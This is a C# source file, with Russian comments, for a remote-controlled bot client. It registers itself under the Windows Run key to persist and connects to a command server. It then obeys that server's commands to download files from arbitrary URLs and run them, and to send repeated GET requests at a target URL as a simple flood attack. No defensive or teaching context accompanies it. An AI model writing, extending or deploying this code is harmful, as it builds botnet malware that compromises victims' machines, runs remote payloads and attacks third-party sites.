using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

class Client
{
    private static TcpClient client;
    private static NetworkStream stream;
    private static string serverIP = "127.0.0.1"; // IP сервера
    private static int serverPort = 12345; // Порт сервера
    private static Thread getRequestThread;
    private static bool stopRequests = false;

    [STAThread]
    static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        // Добавляем в автозапуск
        AddToStartup();

        // Подключаемся к серверу
        ConnectToServer();

        // Ожидаем команды от сервера
        while (true)
        {
            string command = ReadCommand();
            ExecuteCommand(command);
        }
    }

    private static void AddToStartup()
    {
        string path = Application.ExecutablePath;
        string keyName = Path.GetFileName(path);
        Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(keyName, path);
    }

    private static void ConnectToServer()
    {
        client = new TcpClient(serverIP, serverPort);
        stream = client.GetStream();
    }

    private static string ReadCommand()
    {
        byte[] data = new byte[1024];
        int bytes = stream.Read(data, 0, data.Length);
        return Encoding.ASCII.GetString(data, 0, bytes);
    }

    private static void ExecuteCommand(string command)
    {
        string[] parts = command.Split(' ');
        switch (parts[0].ToLower())
        {
            case "download":
                DownloadFile(parts[1], parts[2]);
                break;
            case "run":
                RunFile(parts[1]);
                break;
            case "get":
                StartGetRequests(parts[1]);
                break;
            case "stop":
                StopGetRequests();
                break;
            default:
                break;
        }
    }

    private static void DownloadFile(string url, string path)
    {
        using (var client = new System.Net.WebClient())
        {
            client.DownloadFile(url, path);
        }
    }

    private static void RunFile(string path)
    {
        Process.Start(path);
    }

    private static void StartGetRequests(string url)
    {
        stopRequests = false;
        getRequestThread = new Thread(() =>
        {
            while (!stopRequests)
            {
                using (var client = new System.Net.WebClient())
                {
                    client.DownloadString(url);
                }
                Thread.Sleep(1000); // Пауза между запросами
            }
        });
        getRequestThread.Start();
    }

    private static void StopGetRequests()
    {
        stopRequests = true;
        getRequestThread.Join(); // Ожидаем завершения потока
    }
}
